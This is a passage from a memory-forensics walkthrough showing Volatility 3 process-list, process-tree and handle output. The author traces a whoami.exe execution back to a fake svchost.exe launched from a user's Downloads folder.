</span></span><span style="display:flex;"><span>1996	788	svchost.exe	0x9e8b89fc4080	6	-	0	False	2023-08-10 11:13:43.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>2184	4	MemCompression	0x9e8b8a038040	22	-	N/A	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>2168	788	svchost.exe	0x9e8b8a039240	2	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>6344	788	svchost.exe	0x9e8b8a04f340	4	-	0	False	2023-08-10 11:26:32.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>2256	788	svchost.exe	0x9e8b8a09c240	21	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>2356	788	svchost.exe	0x9e8b8a106280	2	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>2368	788	svchost.exe	0x9e8b8a108280	2	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>2476	788	svchost.exe	0x9e8b8a131240	5	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>2588	788	svchost.exe	0x9e8b8a18c240	4	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>2704	788	svchost.exe	0x9e8b8a2581c0	1	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>2740	788	svchost.exe	0x9e8b8a25b080	11	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>2816	788	svchost.exe	0x9e8b8a2ed300	5	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>2936	788	svchost.exe	0x9e8b8a327240	5	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>2948	788	svchost.exe	0x9e8b8a33b1c0	3	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>2956	788	svchost.exe	0x9e8b8a33d1c0	4	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>6224	788	svchost.exe	0x9e8b8a33e080	4	-	0	False	2023-08-10 11:28:46.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>2644	788	svchost.exe	0x9e8b8a3ea240	2	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>3108	788	svchost.exe	0x9e8b8a42f240	3	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>3204	788	spoolsv.exe	0x9e8b8a43f200	7	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>3316	788	svchost.exe	0x9e8b8a510240	10	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>3464	788	vm3dservice.ex	0x9e8b8a52d080	2	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>3404	788	svchost.exe	0x9e8b8a562080	7	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>3368	788	svchost.exe	0x9e8b8a5631c0	16	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>3324	788	svchost.exe	0x9e8b8a5652c0	7	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>3352	788	svchost.exe	0x9e8b8a574080	1	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>3376	788	svchost.exe	0x9e8b8a575080	3	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>3424	788	Sysmon64.exe	0x9e8b8a578200	13	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>3416	788	vmtoolsd.exe	0x9e8b8a57a280	11	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>3444	788	VGAuthService.	0x9e8b8a57c300	2	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>3680	788	svchost.exe	0x9e8b8a60c2c0	3	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>3756	788	svchost.exe	0x9e8b8a6a4240	6	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>3788	3464	vm3dservice.ex	0x9e8b8a71f200	2	-	1	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>1616	1576	msedgewebview2	0x9e8b8a74f080	22	-	1	False	2023-08-10 11:20:25.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>3816	788	svchost.exe	0x9e8b8a761240	11	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>4132	928	unsecapp.exe	0x9e8b8a9b00c0	3	-	0	False	2023-08-10 11:13:45.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>4912	788	msdtc.exe	0x9e8b8a9b3300	9	-	0	False	2023-08-10 11:13:45.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>2776	7436	RamCapture64.e	0x9e8b8aa66080	5	-	1	False	2023-08-10 11:31:52.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>1552	1576	msedgewebview2	0x9e8b8aa85080	8	-	1	False	2023-08-10 11:20:25.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>4416	928	WmiPrvSE.exe	0x9e8b8aac5280	15	-	0	False	2023-08-10 11:13:45.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>4440	788	dllhost.exe	0x9e8b8aac8080	10	-	0	False	2023-08-10 11:13:45.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>4876	788	svchost.exe	0x9e8b8aedb1c0	4	-	0	False	2023-08-10 11:13:45.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>8260	936	cmd.exe	0x9e8b8afda300	2	-	1	False	2023-08-10 11:27:15.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>6084	1576	msedgewebview2	0x9e8b8b0f1080	19	-	1	False	2023-08-10 11:20:25.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>4308	788	svchost.exe	0x9e8b8b19a1c0	6	-	0	False	2023-08-10 11:13:46.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>4160	788	svchost.exe	0x9e8b8b1ef280	2	-	0	False	2023-08-10 11:13:46.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>1792	788	svchost.exe	0x9e8b8b2561c0	5	-	0	False	2023-08-10 11:13:46.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>5292	928	WmiPrvSE.exe	0x9e8b8b30a280	4	-	0	False	2023-08-10 11:13:47.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>6136	788	svchost.exe	0x9e8b8b34a080	11	-	0	False	2023-08-10 11:13:53.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>5452	788	svchost.exe	0x9e8b8b34b240	28	-	0	False	2023-08-10 11:13:51.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>5796	788	svchost.exe	0x9e8b8b4b61c0	5	-	0	False	2023-08-10 11:13:51.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>5972	788	svchost.exe	0x9e8b8b4cb240	18	-	0	False	2023-08-10 11:13:52.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>1576	5864	msedgewebview2	0x9e8b8b4cc080	47	-	1	False	2023-08-10 11:20:21.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>7128	928	MoUsoCoreWorke	0x9e8b8b526280	10	-	0	False	2023-08-10 11:14:06.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>7008	788	svchost.exe	0x9e8b8b5ea080	6	-	0	False	2023-08-10 11:14:05.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>7072	788	svchost.exe	0x9e8b8b5f0240	9	-	0	False	2023-08-10 11:14:06.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>4364	6812	cmd.exe	0x9e8b8b6ef080	1	-	1	False	2023-08-10 11:30:57.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>8428	8680	SearchProtocol	0x9e8b8b742080	7	-	0	False	2023-08-10 11:29:25.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>5628	788	svchost.exe	0x9e8b8b77e080	4	-	0	False	2023-08-10 11:13:53.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>4272	1828	sihost.exe	0x9e8b8b872280	8	-	1	False	2023-08-10 11:14:07.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>2284	1576	msedgewebview2	0x9e8b8b8dc080	14	-	1	False	2023-08-10 11:20:25.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>4992	788	svchost.exe	0x9e8b8b9bd300	11	-	1	False	2023-08-10 11:14:07.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>4372	788	svchost.exe	0x9e8b8b9ce300	5	-	1	False	2023-08-10 11:14:07.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>9088	788	svchost.exe	0x9e8b8c4020c0	2	-	0	False	2023-08-10 11:26:32.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>6692	788	svchost.exe	0x9e8b8c42c280	3	-	0	False	2023-08-10 11:14:07.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>6768	6692	ctfmon.exe	0x9e8b8c452280	12	-	1	False	2023-08-10 11:14:07.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>6324	1580	taskhostw.exe	0x9e8b8c45a300	8	-	1	False	2023-08-10 11:14:07.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>7436	7400	explorer.exe	0x9e8b8c4d2080	75	-	1	False	2023-08-10 11:14:07.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>7400	744	userinit.exe	0x9e8b8c608340	0	-	1	False	2023-08-10 11:14:07.000000 	2023-08-10 11:14:34.000000 	Disabled
</span></span><span style="display:flex;"><span>7236	788	svchost.exe	0x9e8b8c6b2080	7	-	1	False	2023-08-10 11:14:11.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>8560	788	svchost.exe	0x9e8b8c7430c0	7	-	0	False	2023-08-10 11:24:26.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>4112	1580	GoogleUpdate.e	0x9e8b8c74c080	3	-	0	True	2023-08-10 11:20:19.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>9612	788	SecurityHealth	0x9e8b8c7d6080	11	-	0	False	2023-08-10 11:14:25.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>5196	788	svchost.exe	0x9e8b8ca65300	3	-	0	False	2023-08-10 11:27:43.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>8488	928	RuntimeBroker.	0x9e8b8caa5080	8	-	1	False	2023-08-10 11:14:14.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>3616	928	RuntimeBroker.	0x9e8b8cb62080	6	-	1	False	2023-08-10 11:27:38.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>9712	7436	vmtoolsd.exe	0x9e8b8cbd5080	9	-	1	False	2023-08-10 11:14:26.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>8116	788	svchost.exe	0x9e8b8cc6e240	10	-	0	False	2023-08-10 11:14:11.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>936	7436	svchost.exe	0x9e8b8cd89080	0	-	1	False	2023-08-10 11:22:31.000000 	2023-08-10 11:27:51.000000 	Disabled
</span></span><span style="display:flex;"><span>7704	928	StartMenuExper	0x9e8b8cd9e080	8	-	1	False	2023-08-10 11:14:13.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>652	788	svchost.exe	0x9e8b8cee2080	5	-	0	False	2023-08-10 11:14:13.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>7904	788	svchost.exe	0x9e8b8cf91080	3	-	0	False	2023-08-10 11:27:43.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>4380	928	RuntimeBroker.	0x9e8b8cf95080	3	-	1	False	2023-08-10 11:14:13.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>2728	1576	msedgewebview2	0x9e8b8cf97080	7	-	1	False	2023-08-10 11:20:21.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>8828	928	smartscreen.ex	0x9e8b8cff5300	8	-	1	False	2023-08-10 11:14:15.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>8680	788	SearchIndexer.	0x9e8b9010c240	15	-	0	False	2023-08-10 11:14:15.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>9580	7436	SecurityHealth	0x9e8b90135340	1	-	1	False	2023-08-10 11:14:25.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>10044	9952	OneDrive.exe	0x9e8b90507080	0	-	1	True	2023-08-10 11:15:31.000000 	2023-08-10 11:15:37.000000 	Disabled
</span></span><span style="display:flex;"><span>9976	788	svchost.exe	0x9e8b90509080	0	-	0	False	2023-08-10 11:27:43.000000 	2023-08-10 11:31:46.000000 	Disabled
</span></span><span style="display:flex;"><span>3024	928	TextInputHost.	0x9e8b9050d080	9	-	1	False	2023-08-10 11:17:11.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>4200	788	svchost.exe	0x9e8b90554240	0	-	0	False	2023-08-10 11:14:19.000000 	2023-08-10 11:16:20.000000 	Disabled
</span></span><span style="display:flex;"><span>6680	4364	whoami.exe	0x9e8b905f1080	0	-	1	False	2023-08-10 11:31:01.000000 	2023-08-10 11:31:01.000000 	Disabled
</span></span><span style="display:flex;"><span>4664	928	dllhost.exe	0x9e8b907ef080	8	-	1	False	2023-08-10 11:14:21.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>1908	2740	audiodg.exe	0x9e8b90ec9080	5	-	0	False	2023-08-10 11:27:38.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>6620	928	SecurityHealth	0x9e8b911e2080	0	-	1	False	2023-08-10 11:28:47.000000 	2023-08-10 11:29:52.000000 	Disabled
</span></span><span style="display:flex;"><span>9724	788	svchost.exe	0x9e8b911e3080	4	-	0	False	2023-08-10 11:28:20.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>10176	788	SgrmBroker.exe	0x9e8b911e5080	7	-	0	False	2023-08-10 11:15:45.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>3136	788	MsMpEng.exe	0x9e8b914f0300	10	-	0	False	2023-08-10 11:24:47.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>9816	2776	conhost.exe	0x9e8b91cda080	6	-	1	False	2023-08-10 11:31:52.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>6000	788	svchost.exe	0x9e8b926e7300	2	-	0	False	2023-08-10 11:27:43.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>1244	788	svchost.exe	0x9e8b92987300	5	-	0	False	2023-08-10 11:26:35.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>5864	7436	WinRAR.exe	0x9e8b92bdb0c0	5	-	1	False	2023-08-10 11:20:21.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>1564	788	svchost.exe	0x9e8b92bdf080	1	-	0	False	2023-08-10 11:14:54.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>1668	8260	conhost.exe	0x9e8b92c65300	3	-	1	False	2023-08-10 11:27:15.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>7416	788	svchost.exe	0x9e8b92ddd340	1	-	1	False	2023-08-10 11:15:45.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>10072	788	svchost.exe	0x9e8b92f1c340	9	-	0	False	2023-08-10 11:15:45.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>9784	8680	SearchFilterHo	0x9e8b92fda080	4	-	0	False	2023-08-10 11:31:32.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>1396	788	uhssvc.exe	0x9e8b930402c0	3	-	0	False	2023-08-10 11:15:45.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>5232	928	ApplicationFra	0x9e8b9a26d080	3	-	1	False	2023-08-10 11:27:42.000000 	N/A	Disabled
</span></span><span style="display:flex;"><span>3108	788	svchost.exe	0xb58d4b50f240	3	-	0	False	2023-08-10 11:13:44.000000 	N/A	Disabled
</span></span></code></pre></div><p>We see a process invoked the <code>whoami.exe</code> process. The PID is <code>6680</code>  and PPID is <code>4364</code>. Let&rsquo;s do a process tree on this PPID.</p>
<p>Process Tree on PID <code>4364</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ vol3 -f 20230810.mem windows.pstree --pid <span style="color:#bd93f9">4364</span>
</span></span><span style="display:flex;"><span>Volatility <span style="color:#bd93f9">3</span> Framework 2.7.1
</span></span><span style="display:flex;"><span>Progress:  100.00		PDB scanning finished                        
</span></span><span style="display:flex;"><span>PID	PPID	ImageFileName	Offset<span style="color:#ff79c6">(</span>V<span style="color:#ff79c6">)</span>	Threads	Handles	SessionId	Wow64	CreateTime	ExitTime	Audit	Cmd	Path
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>744	636	winlogon.exe	0x9e8b89441080	4	-	1	False	2023-08-10 11:13:42.000000 	N/A	<span style="color:#f1fa8c">\D</span>evice<span style="color:#f1fa8c">\H</span>arddiskVolume3<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\S</span>ystem32<span style="color:#f1fa8c">\w</span>inlogon.exe	winlogon.exe	C:<span style="color:#f1fa8c">\W</span>INDOWS<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\w</span>inlogon.exe
</span></span><span style="display:flex;"><span>* 7400	744	userinit.exe	0x9e8b8c608340	0	-	1	False	2023-08-10 11:14:07.000000 	2023-08-10 11:14:34.000000 	<span style="color:#f1fa8c">\D</span>evice<span style="color:#f1fa8c">\H</span>arddiskVolume3<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\S</span>ystem32<span style="color:#f1fa8c">\u</span>serinit.exe	-	-
</span></span><span style="display:flex;"><span>** 7436	7400	explorer.exe	0x9e8b8c4d2080	75	-	1	False	2023-08-10 11:14:07.000000 	N/A	<span style="color:#f1fa8c">\D</span>evice<span style="color:#f1fa8c">\H</span>arddiskVolume3<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\e</span>xplorer.exe	C:<span style="color:#f1fa8c">\W</span>INDOWS<span style="color:#f1fa8c">\E</span>xplorer.EXE	C:<span style="color:#f1fa8c">\W</span>INDOWS<span style="color:#f1fa8c">\E</span>xplorer.EXE
</span></span><span style="display:flex;"><span>*** 6812	7436	svchost.exe	0x9e8b87762080	3	-	1	False	2023-08-10 11:30:03.000000 	N/A	<span style="color:#f1fa8c">\D</span>evice<span style="color:#f1fa8c">\H</span>arddiskVolume3<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>imon.stark<span style="color:#f1fa8c">\D</span>ownloads<span style="color:#f1fa8c">\s</span>vchost.exe	<span style="color:#f1fa8c">&#34;C:\Users\simon.stark\Downloads\svchost.exe&#34;</span> 	C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>imon.stark<span style="color:#f1fa8c">\D</span>ownloads<span style="color:#f1fa8c">\s</span>vchost.exe
</span></span><span style="display:flex;"><span>**** 4364	6812	cmd.exe	0x9e8b8b6ef080	1	-	1	False	2023-08-10 11:30:57.000000 	N/A	<span style="color:#f1fa8c">\D</span>evice<span style="color:#f1fa8c">\H</span>arddiskVolume3<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\S</span>ystem32<span style="color:#f1fa8c">\c</span>md.exe	C:<span style="color:#f1fa8c">\W</span>INDOWS<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\c</span>md.exe	C:<span style="color:#f1fa8c">\W</span>INDOWS<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\c</span>md.exe
</span></span><span style="display:flex;"><span>***** 9204	4364	conhost.exe	0x9e8b89ec7080	3	-	1	False	2023-08-10 11:30:57.000000 	N/A	<span style="color:#f1fa8c">\D</span>evice<span style="color:#f1fa8c">\H</span>arddiskVolume3<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\S</span>ystem32<span style="color:#f1fa8c">\c</span>onhost.exe	<span style="color:#f1fa8c">\?</span>?<span style="color:#f1fa8c">\C</span>:<span style="color:#f1fa8c">\W</span>INDOWS<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\c</span>onhost.exe 0x4	C:<span style="color:#f1fa8c">\W</span>INDOWS<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\c</span>onhost.exe
</span></span></code></pre></div><p>We found the process&rsquo;s name that spawned <code>whoami.exe</code>. It was <code>cmd.exe</code>, and it was spawned from another process named <code>svchost.exe</code> which at a first glance looks like a legit windows process (mainly used to load windows services). But the file resides in <code>C:\Windows\System32</code> folder, which is a trusted and protected folder. But in this case, it was loaded from <code>C:\Users\simon.stark\Downloads\svchost.exe</code>. Which looks malicious and suspicious. Please skip to Step 2 to where I dump the malicious file.</p>
<p><strong>Search For The Malicious Files (Alternative Way):</strong></p>
<ul>
<li><em>Step 1: Search for open handles inside the malicious process</em></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ vol3 -f 20230810.mem windows.handles --pid <span style="color:#bd93f9">6812</span>
</span></span><span style="display:flex;"><span>Volatility <span style="color:#bd93f9">3</span> Framework 2.7.1
</span></span><span style="display:flex;"><span>Progress:  100.00		PDB scanning finished                        
</span></span><span style="display:flex;"><span>PID	Process	Offset	HandleValue	Type	GrantedAccess	Name
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b8084e0	0x4	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96564d70	0xc	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b808fe0	0x10	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b9619d890	0x14	íà¿²íà¿²ì¨à¿²ÔÓà¡à¿²á´Ò¦à¡à¿²âÑ¾à¡à¿²ì©à¿²	0x1	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96564140	0x18	IoCompletion	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8c406510	0x1c	TpWorkerFactory	0xf00ff	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8cdda2f0	0x20	IRTimer	0x100002	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b9619ef50	0x24	íà¿²íà¿²ì¨à¿²ÔÓà¡à¿²á´Ò¦à¡à¿²âÑ¾à¡à¿²ì©à¿²	0x1	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8cddb940	0x28	IRTimer	0x100002	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b961a0a20	0x2c	íà¿²íà¿²ì¨à¿²ÔÓà¡à¿²á´Ò¦à¡à¿²âÑ¾à¡à¿²ì©à¿²	0x1	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96564210	0x30	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96563b10	0x34	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b965642f0	0x38	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b808860	0x3c	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b8085e0	0x40	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0xb58d4a3b02a0	0x44	Directory	0x3	KnownDlls
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b90911280	0x48	File	0x100020	<span style="color:#f1fa8c">\D</span>evice<span style="color:#f1fa8c">\H</span>arddiskVolume3<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>imon.stark<span style="color:#f1fa8c">\D</span>ownloads
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96563410	0x4c	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b91697b50	0x50	Mutant	0x1f0001	SM0:6812:304:WilStaging_02
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b89f7d070	0x54	ALPC Port	0x1f0001	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0xb58d4a969480	0x58	Directory	0xf	BaseNamedObjects
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b66ee50	0x5c	Semaphore	0x1f0003	SM0:6812:304:WilStaging_02_p0
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b66f5d0	0x60	Semaphore	0x1f0003	SM0:6812:304:WilStaging_02_p0h
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96563790	0x64	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b965643d0	0x68	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b965644b0	0x6c	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b965649f0	0x70	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96563940	0x74	IoCompletion	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b5ef510	0x78	TpWorkerFactory	0xf00ff	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8cdda730	0x7c	IRTimer	0x100002	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b9619d480	0x80	íà¿²íà¿²ì¨à¿²ÔÓà¡à¿²á´Ò¦à¡à¿²âÑ¾à¡à¿²ì©à¿²	0x1	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b89d05a10	0x84	IRTimer	0x100002	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b961a0e30	0x88	íà¿²íà¿²ì¨à¿²ÔÓà¡à¿²á´Ò¦à¡à¿²âÑ¾à¡à¿²ì©à¿²	0x1	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96564830	0x8c	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96564bb0	0x90	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b82b080	0x98	Thread	0x1fffff	Tid <span style="color:#bd93f9">2032</span> Pid <span style="color:#bd93f9">6812</span>
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b806f60	0x9c	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b809060	0xa4	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96564590	0xac	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b8090e0	0xb0	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b90903e00	0xb4	File	0x16019f	<span style="color:#f1fa8c">\D</span>evice<span style="color:#f1fa8c">\A</span>fd<span style="color:#f1fa8c">\E</span>ndpoint
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96564670	0xbc	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96564750	0xc4	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96563870	0xc8	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96563250	0xcc	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96564c90	0xd0	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b965634f0	0xd4	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b8b8088e0	0xd8	Event	0x1f0003	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96188420	0xdc	íà¿²íà¿²ì¨à¿²ÔÓà¡à¿²á´Ò¦à¡à¿²âÑ¾à¡à¿²ì©à¿²	0x1	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96563330	0xe0	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b965635d0	0xe4	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96563a30	0xe8	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96563bf0	0xec	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b96563cd0	0xf0	EtwRegistration	0x804	
</span></span><span style="display:flex;"><span>6812	svchost.exe	0x9e8b88a4ad40	0xfc	WindowStation	0xf037f	WinSta0
